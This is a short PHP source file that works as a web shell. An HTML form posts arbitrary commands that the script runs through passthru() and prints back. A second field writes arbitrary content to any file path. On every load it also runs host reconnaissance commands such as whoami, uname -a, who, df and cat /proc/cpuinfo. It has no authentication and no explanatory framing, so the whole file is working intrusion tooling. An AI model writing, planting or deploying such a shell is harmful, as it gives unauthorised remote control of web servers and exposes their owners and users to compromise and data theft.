<?php

if(isset($_POST['runcmd'])&& isset($_POST['cmd'])&&$_POST['cmd']!=""){

$cmd = $_POST['cmd'];

}else{

$cmd="";

}

if(isset($_POST['write'])&& isset($_POST['filetowrite'])&&$_POST['filetowrite']!="" && $_REQUEST['txtValue']){

echo "write to file ".$_POST['filetowrite'];

// Set file for opening
$fp = fopen($_POST['filetowrite'], 'w');

// Check if can write to file
if (!$fp)  {
       print 'Could not open desired file for writting';
}

// Finally, write to file
fwrite($fp, $_REQUEST['txtValue']);

// Close the written file
fclose($fp);


}

system("ls -al");
exec("uname -a");


passthru("uname -a");
echo "<br>============================================================<br>";
passthru("whoami");
echo "<br>============================================================<br>";
passthru("who");
echo "<br>============================================================<br>";
echo nl2br(passthru("df"));
echo "<br>============================================================<br>";
passthru("cat /proc/cpuinfo");
echo "<br>============================================================<br>";
passthru("top");
echo "<br>============================================================<br>";

echo "<br><form method=\"POST\">";
echo "Cmd.<input type=\"text\" name=\"cmd\" value=\"".$cmd."\"></input>";
echo "<input type=\"submit\" name=\"runcmd\" value=\"runCmd\"></input><br>";
echo "File.<input type=\"text\" name=\"filetowrite\"></input>";
echo "<input type=\"submit\" name=\"write\" value=\"writeToFile\"></input>";
echo "<textarea cols=100 rows=20 name=\"txtValue\">";
if(isset($cmd)&&$cmd!=""){
passthru($cmd);
}
echo "</textarea></form>";
echo "#################################################################";

?>
